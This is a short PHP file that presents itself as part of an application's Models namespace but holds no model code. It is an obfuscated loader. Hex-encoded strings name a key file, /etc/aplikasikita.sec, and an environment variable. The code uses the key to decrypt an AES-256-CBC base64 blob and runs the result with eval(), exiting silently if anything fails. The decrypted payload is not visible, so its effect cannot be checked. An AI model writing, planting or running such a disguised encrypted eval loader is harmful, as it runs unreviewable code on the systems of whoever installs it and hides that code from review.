<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('vDAUylyJBILu+2nhaLfSVA==');

$c=base64_decode(

'7V0uAr5or523qmFbfSYWBk0OYFwVD0MW5DFi2h38gx/oOty1CJV65MBxhwcPXFraDaiqNRWpYm7r' .
'M/Sfh5C3MwahZKJvJEvwm7Erc0hhPiwCcM8AqdBp5uUfz4uQXAvaZNZ1qo1peOFZg8Rog3kaeYLa' .
'FRaMny4k2jnwsVZ+GgIyXPaVBgcjEJtE+cUtIg/q3INVeNLXAp36xBsT3g7riAvf45cpoCkPpaLj' .
'yPeT9zUP/p13U1AdJHF1OcsO1zN/p8q4GUeEadUJo8tF73OjTpuXjv81NhGKMNvM5V3VsgZ7XC8u' .
'EzYNmULdZFDYTcomlvHMgMAgYfbH6Yc7zNb3/NsFj72diC/K5hfqTXl1VkKgZpMJN/wQkjgm6j6+' .
'JUunuRcP1fz+oKQDXNs8lZy/X+V4boWdg/HyYoryX8AjI4N1n/xe1lFjQtxa2wm22k8Jv0lZPml6' .
'eIESsUuH7GHMIEMM7Ki35dgYxHKp16xaNuFMSC4uo5CZADYMmPQDwtxpVIyL/6imSlYx8qH7t3hP' .
'NI32Ph01tgVagsz5ggVHfUNzuIXr4fUv85u4jeXDnE6hjI9BN13QDega7AS33ijs082AgQilZLXM' .
'eY0yfhR6+XeB3P/9qp3OwRvp45O3U978E78ubTutGKT1465kv+D0TqSMSicZ3n/h7p/HdmE64b8Y' .
'1T8cWZAR3H0qGA/xGd30Qx/JJ73yTzqPoT8nYYkQqEdAlBdyh2Jaaoiyn9kqsa3OcEGtnGUsC+Pa' .
'1Fh7H+TTUzMyXR1gVZPInT165YHyz33E5OXZvGIgEcwJ0AstL/zcjTp1u2L1D5LSMlyqslhuchTK' .
'xcpKbfS2P+7SCAtEPodbw1pjo4TG1yuswyKwWp0LbhHTl3u5fc13Od81LLmr7sgA/0o5mj7WN605' .
'0zfEFgeA6MuQjJj5kj+oatGjvM04zQL/c4azl1MHEL1XJ2kMw3NHgfIUSfxRyYSybnpbsYwK5cu+' .
'AX7V3NhuxjLo6+6Syt+64o6LL0rDobYW6RENDJLi7mTo9GcYvnTfVyUa9mxr93EGJvcZt5QE474X' .
'ks35jXL3THmO+mfsOweIW+LqMyj3w+6qbR0MHUyjocnx7Ewvq9fBGTd0pvg+19PZ/sTvINHIt+MX' .
'ffZLy8Q6UqxCt8zw2dUPsB42PtvNN0pMzwkCpakYgvbGiSiStRAQYFINwpIBc4l7uzxCjIZFaKJY'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

